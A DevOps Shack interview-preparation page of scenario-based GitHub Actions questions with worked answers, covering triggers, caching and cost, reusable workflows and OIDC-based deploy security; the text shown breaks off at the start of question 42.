# GitHub Actions — Scenario-Based Questions

<!-- DEVOPS-SHACK:HEADER -->
<p align="center">
  <a href="https://www.youtube.com/@devopsshack"><img alt="YouTube DevOps Shack" src="https://img.shields.io/badge/YouTube-DevOps%20Shack-FF0000?style=flat-square&logo=youtube&logoColor=white"/></a>
  <a href="https://www.youtube.com/@shackverse"><img alt="YouTube DevOps Shack Hindi" src="https://img.shields.io/badge/Hindi-@shackverse-FF0000?style=flat-square&logo=youtube&logoColor=white"/></a>
  <a href="https://devopsshack.com"><img alt="devopsshack.com" src="https://img.shields.io/badge/Courses-devopsshack.com-C6FF4D?style=flat-square&labelColor=0B0F1A"/></a>
  <a href="https://www.instagram.com/devopsshack"><img alt="Instagram" src="https://img.shields.io/badge/Instagram-@devopsshack-E4405F?style=flat-square&logo=instagram&logoColor=white"/></a>
  <a href="https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack"><img alt="Original repo" src="https://img.shields.io/badge/Original-DevOps%20Shack%20repo-4DE8FF?style=flat-square&logo=github&labelColor=0B0F1A"/></a>
</p>
<p align="center"><sub>Part of <b><a href="https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack">DevOps &amp; Cloud Interview Preparation</a></b> — created by <b><a href="https://www.youtube.com/@devopsshack">DevOps Shack</a></b>. Free to learn from; please credit DevOps Shack when sharing.</sub></p>
<!-- /DEVOPS-SHACK:HEADER -->

> Real-world GitHub Actions situations and how to reason through them in an interview · 100 questions · 🟢 Beginner 🟡 Intermediate 🔴 Advanced

[⬅ Back to GitHub Actions](./README.md) · [🏠 Home](../README.md)

## Table of contents
- [Pipeline Design & Triggers](#pipeline-design--triggers) — Q1–Q20
- [Speed, Caching & Cost](#speed-caching--cost) — Q21–Q36
- [Reuse at Scale: Reusable Workflows & Actions](#reuse-at-scale-reusable-workflows--actions) — Q37–Q52
- [Secrets, OIDC & Environments](#secrets-oidc--environments) — Q53–Q70
- [Security Hardening & Supply Chain](#security-hardening--supply-chain) — Q71–Q86
- [Runners, ARC, Monorepos & Releases](#runners-arc-monorepos--releases) — Q87–Q100

---

## Pipeline Design & Triggers

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q1. You join a team whose single 900-line workflow runs everything on every push to every branch. How do you restructure it? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** One file, no filters, no separation of CI and CD: slow feedback, wasted minutes, and deploys mixed with tests.

**What I'd do →**
1. Split by purpose: `ci.yml` (PR and `main`: lint, test, build), `cd.yml` (on `main`: image and deploys), `release.yml` (tags), `nightly.yml` (schedule).
2. Add triggers with filters:
   ```yaml
   on:
     pull_request:
     push:
       branches: [main]
   ```
3. Move repeated setup into a composite action and deploy logic into a reusable workflow.
4. Add `concurrency` with PR cancellation, `permissions: contents: read`, and `timeout-minutes` on every job.
5. Add a fan-in `ci-ok` job and make it the only required check.

**Why →** Smaller files are reviewable, PR feedback gets faster, and deploy permissions are isolated from test jobs.

**Interview tip →** Say "separate by trigger and by privilege", not just "split the file".

</details>

### Q2. Pushing to a PR branch runs CI twice (once for push, once for pull_request). How do you fix it? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** `on: [push, pull_request]` with no branch filters fires both events for every commit on a PR branch.

**What I'd do →**
1. Restrict `push` to long-lived branches and let PRs cover feature branches:
   ```yaml
   on:
     push:
       branches: [main, "release/**"]
     pull_request:
   ```
2. Add `concurrency` keyed on PR number or ref so leftovers cancel.

**Why →** Halves CI minutes for feature work while still validating `main` after merge.

**Interview tip →** Mention that `pull_request` tests the merge commit, which is more valuable than testing the branch head alone.

</details>

### Q3. Product wants a "Deploy to staging" button that lets QA pick a version. Design it. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** A manual, parameterized deploy with guardrails.

**What I'd do →**
1. `workflow_dispatch` with typed inputs:
   ```yaml
   on:
     workflow_dispatch:
       inputs:
         version: { type: string, required: true, description: "Image tag, for example v1.4.0" }
         environment: { type: environment, required: true }
   ```
2. A first job validates the tag exists in ECR (`aws ecr describe-images --image-ids imageTag=$VERSION`).
3. Call the reusable deploy workflow with `environment: ${{ inputs.environment }}`, so environment rules apply (prod still needs approvers).
4. Write the deployed version to `$GITHUB_STEP_SUMMARY`.

**Why →** QA self-serves without kubectl access, and the environment layer keeps prod controlled.

**Interview tip →** Use `type: environment` so the dropdown lists real environments and typos are impossible.

</details>

### Q4. A nightly security scan should run at 02:00 India time on weekdays and also be runnable on demand. Write it. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Cron is UTC; IST is UTC+5:30.

**What I'd do →**
1. Convert: 02:00 IST is 20:30 UTC the previous day, so weekdays Monday to Friday IST map to Sunday to Thursday UTC:
   ```yaml
   on:
     schedule:
       - cron: "30 20 * * 0-4"
     workflow_dispatch:
   ```
2. Guard against forks: `if: github.repository == 'devopsshack/shack-api'`.
3. Notify on failure only (`if: failure()`).

**Why →** The day-of-week shift is the classic mistake when converting to UTC.

**Interview tip →** Mention that schedules are best-effort and can be delayed at peak load, so do not use them for time-critical jobs.

</details>

### Q5. Your team wants preview environments per PR on EKS, destroyed when the PR closes. Design the workflow. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Lifecycle tied to PR events; must be safe for forks.

**What I'd do →**
1. Trigger on `pull_request` types `[opened, synchronize, reopened, labeled, closed]`, run only when label `preview` exists and the PR is from the same repo:
   ```yaml
   if: github.event.pull_request.head.repo.full_name == github.repository && contains(github.event.pull_request.labels.*.name, 'preview')
   ```
2. Deploy job (not closed): build image tagged `pr-${{ github.event.number }}`, `helm upgrade --install pr-123 ./chart -n preview-pr-123 --create-namespace`, environment `preview` with `url`.
3. Teardown job: `if: github.event.action == 'closed'`, `helm uninstall` and `kubectl delete ns`.
4. `concurrency: preview-${{ github.event.number }}` without cancel for teardown.
5. A nightly job deletes namespaces whose PR is closed, in case teardown failed.

**Why →** Fork PRs have no secrets, so restricting to same-repo PRs avoids failures and abuse.

**Interview tip →** Always mention the garbage collector job; teardown hooks fail eventually.

</details>

### Q6. Two workflows must run in sequence: CI then a separate deploy workflow owned by another team. How do you link them? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Separate files, possibly separate owners.

**What I'd do →**
1. Prefer making deploy a reusable workflow the CI calls as a job with `needs`. One run, one graph, outputs passed directly.
2. If they must stay separate, use `workflow_run`:
   ```yaml
   on:
     workflow_run:
       workflows: ["CI"]
       types: [completed]
       branches: [main]
   jobs:
     deploy:
       if: github.event.workflow_run.conclusion == 'success'
   ```
3. Use `github.event.workflow_run.head_sha` to deploy exactly the CI-tested commit, and download its artifact with `run-id`.

**Why →** `workflow_run` alone triggers on failures too and runs on the default branch context, so the conclusion and SHA checks are required.

**Interview tip →** Mention that `workflow_run` only chains up to three levels deep.

</details>

### Q7. A merge queue is enabled, but PRs sit in the queue forever. What is your design fix? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Required checks never report on the queue's temporary branches.

**What I'd do →**
1. Add the trigger:
   ```yaml
   on:
     pull_request:
     merge_group:
   ```
2. Make sure job names in `merge_group` runs match the required check (fan-in `ci-ok`).
3. Do not use `paths` filters on that workflow; queue commits combine multiple PRs.

**Why →** The queue waits for required checks on `gh-readonly-queue/...` commits, which only `merge_group` produces.

**Interview tip →** Explain the merge queue value: it tests the combination of PRs, preventing "green PR, red main".

</details>

### Q8. Your deploy job must run only for pushes to `main` and for `v*` tags, never for PRs. Write the conditions. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Routing logic at job level.

**What I'd do →**
1. Trigger on both:
   ```yaml
   on:
     pull_request:
     push:
       branches: [main]
       tags: ["v*"]
   ```
2. Gate the deploy job:
   ```yaml
   deploy:
     needs: build
     if: github.event_name == 'push' && (github.ref == 'refs/heads/main' || startsWith(github.ref, 'refs/tags/v'))
   ```
3. Back it with environment deployment branch policies so the YAML is not the only protection.

**Why →** Defence in depth: someone can edit the YAML in a branch, but not the environment policy.

**Interview tip →** "Conditions are routing, environments are enforcement."

</details>

### Q9. A database migration must run once per deploy, before the app rolls out, with approval in prod. How do you model it? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Ordered, gated, and must not run concurrently.

**What I'd do →**
1. Separate job `migrate` with `environment: prod` and `concurrency: { group: migrate-prod, cancel-in-progress: false }`.
2. Run the migration as a Kubernetes Job using the same image digest (`kubectl apply` then `kubectl wait --for=condition=complete job/migrate-<sha> --timeout=10m`).
3. `deploy` has `needs: migrate`.
4. Migrations are backward compatible (expand and contract), so rollback of the app does not require rolling back the schema.

**Why →** Approval once, ordering guaranteed by `needs`, no parallel migrations thanks to concurrency.

**Interview tip →** Mention expand and contract; interviewers look for schema rollback awareness.

</details>

### Q10. Developers complain CI takes 25 minutes. Where do you start? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Need data before optimizing.

**What I'd do →**
1. Pull timings: `gh run view <id> --json jobs --jq '.jobs[] | {name, startedAt, completedAt}'` across 20 runs, and check queue time vs execution time.
2. Look for: serial jobs that could be parallel, missing caches (setup step minutes), Docker builds without layer cache, tests not sharded, a full matrix on every PR.
3. Fix in order of impact: caching, parallelism with `needs` graph, test sharding with matrix, PR-only reduced matrix, cancel superseded runs.
4. If queue time dominates, the account's concurrency limit or self-hosted capacity is the bottleneck, not the YAML.

**Why →** Queue time and run time have completely different fixes.

**Interview tip →** Quote a before-and-after number from your own experience.

</details>

### Q11. You need to run integration tests against Postgres and Redis in CI. How do you set it up? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Service containers are the native fit.

**What I'd do →**
1. Declare services with health checks:
   ```yaml
   services:
     postgres:
       image: postgres:16
       env: { POSTGRES_PASSWORD: test, POSTGRES_DB: app }
       ports: ["5432:5432"]
       options: --health-cmd "pg_isready -U postgres" --health-interval 5s --health-retries 10
     redis:
       image: redis:7
       ports: ["6379:6379"]
   ```
2. Point the app at `localhost` (job on host) with `env: DATABASE_URL: postgres://postgres:test@localhost:5432/app`.
3. Run migrations then tests.

**Why →** Services start before steps and are torn down automatically; health options prevent "connection refused" races.

**Interview tip →** Explain `localhost` vs service-name networking for host vs container jobs.

</details>

### Q12. You must support Node 20, 22 and 24 on Linux, plus Node 22 on Windows only. Write the matrix. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Base matrix plus a standalone extra combination.

**What I'd do →**
1. Define the matrix:
   ```yaml
   strategy:
     fail-fast: false
     matrix:
       os: [ubuntu-24.04]
       node: [20, 22, 24]
       include:
         - os: windows-2025
           node: 22
   runs-on: ${{ matrix.os }}
   ```
2. Use `shell: bash` for scripts so they run on Windows (Git Bash) too.

**Why →** `include` with a combination that matches nothing adds a new leg, keeping the matrix minimal.

**Interview tip →** `fail-fast: false` so a Windows-only failure does not hide Linux results.

</details>

### Q13. Builds must be reproducible: the same commit should produce the same pipeline behaviour next month. What do you pin? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Drift comes from runner images, actions, tool versions and dependencies.

**What I'd do →**
1. `runs-on: ubuntu-24.04` (not latest).
2. Actions pinned to SHAs with Dependabot updates.
3. Tool versions explicit: `node-version-file: .nvmrc`, `terraform_version: 1.9.8`, kubectl via `azure/setup-kubectl` with `version: v1.31.2`.
4. Lockfiles with `npm ci`, `pip install --require-hashes`.
5. Base images pinned by digest in Dockerfiles.

**Why →** "Nothing changed but CI broke" is almost always one of these floating.

**Interview tip →** Mention that hosted runner images update weekly; preinstalled tool versions are not a contract.

</details>

### Q14. You want to run expensive E2E tests only when a PR has the `run-e2e` label, and re-run when the label is added. How? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Needs the `labeled` activity type plus a condition.

**What I'd do →**
1. Trigger on the label event and filter on the label name:
   ```yaml
   on:
     pull_request:
       types: [opened, synchronize, reopened, labeled]
   jobs:
     e2e:
       if: contains(github.event.pull_request.labels.*.name, 'run-e2e')
   ```
2. Use a concurrency group per PR so adding another label does not run E2E twice in parallel.
3. Make E2E non-required, or required through the fan-in job that treats `skipped` as pass.

**Why →** Labels are a cheap opt-in for expensive suites.

**Interview tip →** Note that `labeled` fires for any label, hence the `contains` filter.

</details>

### Q15. Leadership wants a weekly report of failed workflow runs across 50 repos. How do you build it? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Cross-repo read access and aggregation.

**What I'd do →**
1. Central repo with a `schedule` workflow.
2. GitHub App token with `actions: read` on the org's repos (`actions/create-github-app-token` with `owner: devopsshack`).
3. Script with `gh api --paginate "repos/ORG/$r/actions/runs?status=failure&created=>=$(date -d '7 days ago' +%F)"`, aggregate by workflow and repo.
4. Write markdown to `$GITHUB_STEP_SUMMARY` and post to Slack.

**Why →** `GITHUB_TOKEN` is single-repo; an App token is the right cross-repo identity.

**Interview tip →** For orgs at scale, mention streaming audit logs and Actions metrics instead of polling.

</details>

### Q16. You need to run a job only when files in `infra/` changed, but the workflow also has other jobs that always run. How? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Workflow-level `paths` would skip everything; need job-level filtering.

**What I'd do →**
1. A `changes` job using `dorny/paths-filter` with outputs `infra: 'true'|'false'`.
2. `terraform` job: `needs: changes`, `if: needs.changes.outputs.infra == 'true'`.
3. Fan-in job treats `skipped` as success.

**Why →** Skipped jobs report as success to branch protection, skipped workflows report nothing.

**Interview tip →** This is the canonical answer to "path filters vs required checks".

</details>

### Q17. A flaky test fails 1 in 10 runs and blocks merges. What do you do with the pipeline? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Pipeline reliability problem with a code root cause.

**What I'd do →**
1. Quantify: search failed runs for the test name (`gh run view --log-failed`), tag it.
2. Quarantine: move it to a separate non-blocking job with `continue-on-error: true` and a tracking issue with an owner and date.
3. Fix the cause (time, ordering, shared state, network) and move it back.
4. Avoid blanket retries in the pipeline; if used, retry only the specific test with the framework's retry and report retries.

**Why →** Retries hide flakiness; quarantine keeps visibility while unblocking the team.

**Interview tip →** "Flaky tests are bugs with an owner and a deadline."

</details>

### Q18. You want CI results visible to reviewers without opening logs. What do you add? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Improve signal on the PR page.

**What I'd do →**
1. Annotations from linters (`eslint -f @microsoft/eslint-formatter-sarif` uploaded to code scanning, or problem matchers).
2. Test summary in `$GITHUB_STEP_SUMMARY` (pass, fail, slowest tests).
3. Coverage comment via a `workflow_run` job (works for forks too).
4. Upload HTML reports as artifacts with short retention.

**Why →** Reviewers see failures inline on the diff and the summary page.

**Interview tip →** Mention `::error file=,line=::` annotations; it shows you know workflow commands.

</details>

### Q19. A workflow must run Terraform plan on PRs and apply on merge, with the plan reviewed. Design it. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Plan and apply must correspond, apply must be gated.

**What I'd do →**
1. PR: `terraform plan -out=tfplan` with a read-only OIDC role (`sub` = `pull_request`), post the plan text as a PR comment (via `workflow_run` for forks), upload `tfplan` is not reused because state may change.
2. Merge to `main`: re-plan with the apply role, upload plan, then an `apply` job with `environment: prod-infra` (required reviewers) that downloads the plan artifact and runs `terraform apply tfplan`.
3. `concurrency: terraform-prod` with no cancel to protect state.
4. The apply role's trust: `repo:ORG/infra:environment:prod-infra`.

**Why →** Reviewers approve the exact saved plan that will be applied, and only the gated job holds write credentials.

**Interview tip →** Explain why the PR plan is not applied: state can drift between PR and merge.

</details>

### Q20. Your company forbids deploys on Friday after 16:00 and during incidents. How do you enforce it? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Policy that must not depend on YAML in every repo.

**What I'd do →**
1. Use a custom deployment protection rule (a GitHub App) on the `prod` environment that checks the change calendar and the incident tool API, then approves or rejects.
2. As a lighter option, a required first step in the shared reusable deploy workflow that checks the window and fails with a clear message, with a `force` input that requires an extra environment (`prod-emergency`) with senior approvers.
3. Log every override to the summary and Slack.

**Why →** Environment-level rules apply to every workflow that targets `prod` and cannot be removed by editing one repo's YAML.

**Interview tip →** Always include a documented break-glass path; freezes without one get bypassed badly.

</details>

## Speed, Caching & Cost

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q21. `npm ci` takes 4 minutes on every run. Fix it. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** No dependency caching.

**What I'd do →**
1. Configure built-in caching and a lean install:
   ```yaml
   - uses: actions/setup-node@v4
     with:
       node-version-file: .nvmrc
       cache: npm
   - run: npm ci --prefer-offline --no-audit --no-fund
   ```
2. Confirm "Cache restored from key: node-cache-Linux-x64-npm-<hash>" in logs.
3. Make sure a run on `main` populates the cache so PRs inherit it.

**Why →** The download cache cuts most of the time; `npm ci` keeps installs exact.

**Interview tip →** Explain branch scoping: PR caches do not help other PRs, `main` caches do.

</details>

### Q22. Docker builds take 12 minutes even when only one line of code changed. Speed them up. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** No layer cache on ephemeral runners, likely poor Dockerfile ordering.

**What I'd do →**
1. Fix Dockerfile order: copy lockfile, install, then copy source.
2. Use BuildKit with the GHA cache:
   ```yaml
   - uses: docker/setup-buildx-action@v3
   - uses: docker/build-push-action@v6
     with:
       cache-from: type=gha,scope=api
       cache-to: type=gha,mode=max,scope=api
   ```
3. Use `RUN --mount=type=cache,target=/root/.npm npm ci` for package caches inside the build.
4. For images over a few GB, use `type=registry` cache in ECR instead to avoid evicting the repo's other caches.

**Why →** Each hosted job starts with an empty Docker daemon; without an exported cache nothing is reused.

**Interview tip →** Mention `mode=max` for multi-stage builds.

</details>

### Q23. The repo hits the 10 GB cache limit daily and hit rates are poor. What do you change? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Cache thrashing: too many large, unique caches.

**What I'd do →**
1. `gh cache list --sort size_in_bytes --limit 30` to find the biggest keys.
2. Save caches only on `main` (`actions/cache/restore` everywhere, `actions/cache/save` with `if: github.ref == 'refs/heads/main'`).
3. Remove `github.sha` or run IDs from keys where not needed.
4. Give Docker caches a `scope` and move big ones to registry cache.
5. Delete PR caches on PR close (`gh cache delete --ref refs/pull/N/merge` in a cleanup workflow).

**Why →** LRU eviction across branches throws away the useful `main` caches first when PRs flood the store.

**Interview tip →** "Write caches on main, read them everywhere."

</details>

### Q24. macOS jobs are 60% of your bill. What are your options? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** macOS minutes have a 10x multiplier in private repos.

**What I'd do →**
1. Run macOS only where required (iOS build and signing), not for lint or unit tests that can run on Linux.
2. Run the full macOS matrix on `main` and nightly, a single leg on PRs.
3. Cache CocoaPods, SPM and DerivedData.
4. Path filter so backend changes do not trigger iOS pipelines.
5. Evaluate self-hosted Mac minis or a cloud Mac provider for very high volume, including maintenance cost.

**Why →** Most savings come from not running macOS at all for jobs that do not need it.

**Interview tip →** Quote the multipliers: Linux 1x, Windows 2x, macOS 10x.

</details>

### Q25. A job sometimes hangs and burns 6 hours. How do you stop it happening again? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Default 360-minute timeout.

**What I'd do →**
1. Set `timeout-minutes` on every job based on p95 duration times 2 (for example 20).
2. Add step-level timeouts on network steps and tool timeouts (`kubectl rollout status --timeout=300s`, `curl --max-time 30`).
3. Add an actionlint or custom check that fails PRs adding jobs without `timeout-minutes`.

**Why →** A single hung job on a large runner can cost more than a week of normal CI.

**Interview tip →** Mention that timeouts also free up concurrency slots, not just money.

</details>

### Q26. Your PR matrix is 3 OS times 4 versions (12 jobs). How do you cut cost without losing coverage? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Full coverage is needed before release, not on every PR push.

**What I'd do →**
1. Build the matrix dynamically: on `pull_request`, Linux with the latest and oldest supported versions; on `push` to `main` and nightly, the full matrix.
   ```yaml
   matrix: ${{ fromJSON(github.event_name == 'pull_request' && '{"os":["ubuntu-24.04"],"node":[20,24]}' || '{"os":["ubuntu-24.04","windows-2025","macos-15"],"node":[20,22,24]}') }}
   ```
2. Keep the fan-in check stable regardless of matrix size.

**Why →** Most regressions surface on one OS and the version extremes.

**Interview tip →** Show the `fromJSON` ternary trick; it proves fluency with expressions.

</details>

### Q27. Test suite takes 30 minutes on one runner. How do you parallelize it in Actions? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Sharding across matrix legs.

**What I'd do →**
1. Split into shards:
   ```yaml
   strategy:
     fail-fast: false
     matrix:
       shard: [1, 2, 3, 4, 5, 6]
   steps:
     - run: npx jest --shard=${{ matrix.shard }}/${{ strategy.job-total }}
   ```
2. Upload per-shard results (`junit-${{ matrix.shard }}`) and merge in a fan-in job.
3. Balance shards by timing data if the tool supports it.

**Why →** Wall-clock drops roughly 5x; billed minutes rise slightly due to per-job overhead.

**Interview tip →** Be honest that sharding trades minutes for developer time.

</details>

### Q28. Every PR runs a 10-minute CodeQL scan for a docs change. Fix it. 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Missing path filters on a non-required analysis workflow.

**What I'd do →**
1. Exclude docs from the trigger:
   ```yaml
   on:
     pull_request:
       paths-ignore: ["docs/**", "**/*.md"]
   ```
2. If it is a required check, instead do job-level filtering so a check is still reported.

**Why →** Workflow-level filters are fine for non-required workflows and save the most.

**Interview tip →** Always ask "is it required?" before adding workflow-level path filters.

</details>

### Q29. Builds download the same 2 GB ML model on every run. What do you do? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Large static input; cache or move it.

**What I'd do →**
1. `actions/cache` keyed on the model version: `key: model-${{ vars.MODEL_VERSION }}`.
2. If it exceeds what the cache can hold well (with other caches), host it in S3 in the same region as self-hosted runners and pull with OIDC credentials.
3. For ARC runners, bake it into the runner image or a node-local volume.

**Why →** Version-keyed caches never invalidate accidentally and restore in seconds.

**Interview tip →** Mention the repo cache quota as a constraint on big blobs.

</details>

### Q30. You want to know which workflows consume the most minutes across the org. How? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Billing visibility.

**What I'd do →**
1. Org Settings, Billing: usage report CSV per repo and workflow, and the Actions usage metrics in org Insights.
2. API: `gh api repos/ORG/REPO/actions/runs/RUN_ID/timing` for per-run billable ms by OS.
3. Rank by minutes times multiplier, then target the top 5 workflows.

**Why →** Cost work follows a power law; a few workflows dominate.

**Interview tip →** Mention measuring before and after each change.

</details>

### Q31. A Go monorepo build is slow because the Go build cache is cold. Optimize. 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Two caches matter: module download cache and build cache.

**What I'd do →**
1. `actions/setup-go@v5` with `go-version-file: go.mod` (caching on by default, keyed on `go.sum`).
2. Set `cache-dependency-path` for multiple modules: `"**/go.sum"`.
3. Restore-only on PRs, save on `main` if cache churn is a problem.

**Why →** The build cache (`~/.cache/go-build`) avoids recompiling unchanged packages.

**Interview tip →** Know the two directories: `GOMODCACHE` and `GOCACHE`.

</details>

### Q32. Small lint, format and typecheck jobs each take 40 seconds of setup for 10 seconds of work. Should you merge them? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** Per-job overhead dominates.

**What I'd do →**
1. Merge into one `static-checks` job with sequential steps, each named clearly.
2. Use `if: ${{ !cancelled() }}` on later steps so all checks report even if one fails.
3. Keep long, independent suites (unit tests, build) as separate parallel jobs.

**Why →** Each job pays VM allocation, checkout, setup and cache restore.

**Interview tip →** "Fat jobs for tiny tasks, parallel jobs for long ones."

</details>

### Q33. Artifact storage costs are climbing. What do you change? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** 90-day default retention on large build outputs.

**What I'd do →**
1. Set `retention-days: 3` on intermediate artifacts, keep reports for 14.
2. Lower the repo or org default retention.
3. Move release binaries to GitHub Releases or a registry.
4. Delete old artifacts via API in bulk if needed.

**Why →** Most artifacts are only useful for the next job or the next day.

**Interview tip →** Distinguish artifacts (run outputs) from releases (deliverables).

</details>

### Q34. Multi-arch images take 40 minutes because arm64 builds use QEMU. Fix it. 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Emulation is 5 to 20 times slower than native.

**What I'd do →**
1. Matrix over native runners: `ubuntu-24.04` (amd64) and `ubuntu-24.04-arm` (arm64).
2. Each leg builds and pushes by digest only (`outputs: type=image,push-by-digest=true,name-canonical=true,push=true`) and uploads the digest as artifact `digest-${{ matrix.arch }}`.
3. Merge job downloads digests and runs `docker buildx imagetools create -t $IMAGE:$TAG $IMAGE@sha256:a $IMAGE@sha256:b`.

**Why →** Native builds remove emulation entirely; the manifest list makes one tag serve both architectures.

**Interview tip →** Name the pattern: "build by digest per platform, merge manifest".

</details>

### Q35. A workflow rebuilds the same image in staging and prod deploys. What is wrong and how do you fix it? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Rebuilding per environment wastes minutes and breaks the guarantee that tested equals shipped.

**What I'd do →**
1. Build once in a `build` job, output the digest.
2. Deploy jobs (or reusable workflow calls) use `image@digest` from `needs.build.outputs.digest`.
3. Promotion to prod via release tag adds a tag to the existing manifest, no rebuild.

**Why →** Rebuilds can pull different base images or dependencies, so prod runs something nobody tested.

**Interview tip →** "Build once, deploy many, by digest."

</details>

### Q36. Self-hosted runners are idle 70% of the time but queues spike at 10:00. What do you do? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Static capacity sized for peak.

**What I'd do →**
1. Move to ARC with `minRunners` small and `maxRunners` sized for peak, on a node pool managed by Karpenter with spot instances for CI.
2. Schedule higher `minRunners` during working hours (a CronJob that patches the scale set, or two scale sets).
3. Pre-pull the runner image on nodes and keep images small to reduce cold starts.
4. Measure queue time from the run timing API before and after.

**Why →** Autoscaling turns idle cost into burst cost, and spot cuts the burst cost further.

**Interview tip →** Mention handling spot interruptions: jobs are retried by re-running, so keep jobs idempotent.

</details>

## Reuse at Scale: Reusable Workflows & Actions

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q37. Forty microservice repos each have a slightly different copy of the same build workflow. How do you standardize? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Copy-paste drift; fixes do not propagate.

**What I'd do →**
1. Create `devopsshack/platform-workflows` with reusable workflows: `build-image.yml`, `deploy-eks.yml`, `security-scan.yml`, each with typed inputs and outputs.
2. Set the repo's Actions access to "Accessible from repositories in the organization".
3. Release with semver tags and a moving `v1`; consumers pin `@v1` (or SHA with Renovate).
4. Migrate repos with a scripted PR (gh CLI loop), starting with two pilot teams.
5. Enforce a minimum baseline (scan workflow) through a ruleset "require workflows to pass".

**Why →** One fix lands everywhere with a version bump, and governance moves to the platform team.

**Interview tip →** Mention versioning and a migration plan; a central workflow without versions breaks everyone at once.

</details>

### Q38. A team wants to share "checkout, setup Java, Maven cache, run Sonar" steps. Reusable workflow or composite action? 🟢

<details>
<summary><b>Answer</b></summary>

**Situation read →** A sequence of steps that should run inside the consumer's job.

**What I'd do →**
1. Composite action in `platform-actions/java-setup/action.yml`, inputs `java-version` and `sonar-token`.
2. Consumers add it as one step and keep their own job settings and runner choice.

**Why →** No need for separate runners, environments or permissions; a composite is lighter and composes with the consumer's other steps.

**Interview tip →** Note the composite cannot read `secrets` directly, so the Sonar token is an input.

</details>

### Q39. A shared reusable workflow change broke 120 pipelines on Monday. How do you prevent a repeat? 🟡

<details>
<summary><b>Answer</b></summary>

**Situation read →** Consumers referenced `@main` and got an untested change.

**What I'd do →**
1. Stop `@main` references: publish semver tags; consumers use `@v2` or SHAs.
2. Add a test matrix in the workflows repo that calls each reusable workflow against sample apps on every PR.
3. Release breaking changes as a new major with a migration note and overlap period.
4. Canary: bump a few internal repos first via Renovate grouping.

**Why →** Shared CI is production software and deserves release engineering.

**Interview tip →** "We treat the platform workflow repo like a library with semver."

</details>

### Q40. A called reusable workflow needs a Sonar token, an npm token and AWS access. How do you pass them? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Secrets plus cloud identity across a workflow boundary.

**What I'd do →**
1. Declare named secrets in `workflow_call.secrets` (`SONAR_TOKEN`, `NPM_TOKEN`) and pass explicitly from the caller.
2. No AWS secret at all: caller job grants `id-token: write`, the called workflow runs `configure-aws-credentials` with a role ARN input.
3. Trust policy can pin to the reusable workflow via `job_workflow_ref` claim if the org customizes `sub`.

**Why →** Explicit secrets document the contract; OIDC removes the most dangerous secret.

**Interview tip →** Mention why `secrets: inherit` is avoided across team boundaries.

</details>

### Q41. You want to ensure only the central deploy workflow can assume the production AWS role, not arbitrary workflows in app repos. How? 🔴

<details>
<summary><b>Answer</b></summary>

**Situation read →** Default `sub` identifies the repo and environment, not the workflow file.

**What I'd do →**
1. Customize the OIDC subject template for the org or repos to include `job_workflow_ref`:
   ```bash
   gh api -X PUT orgs/devopsshack/actions/oidc/customization/sub \
     --input - <<< '{"include_claim_keys":["repo","context","job_workflow_ref"]}'
   ```
2. Trust policy `StringLike` on `sub` to `repo:devopsshack/*:environment:prod:job_workflow_ref:devopsshack/platform-workflows/.github/workflows/deploy-eks.yml@refs/tags/v*`.
3. Keep the platform-workflows repo protected (CODEOWNERS, tag rulesets).

**Why →** App teams can call the deploy workflow but cannot write their own job that assumes the prod role.

**Interview tip →** This is an advanced answer; few candidates know `job_workflow_ref`.

</details>

### Q42. You need an action that comments a Terraform plan summary on PRs and must work on Linux and Windows. Which kind? 🟢

<details>
<summary><b>Answer</b></summary>

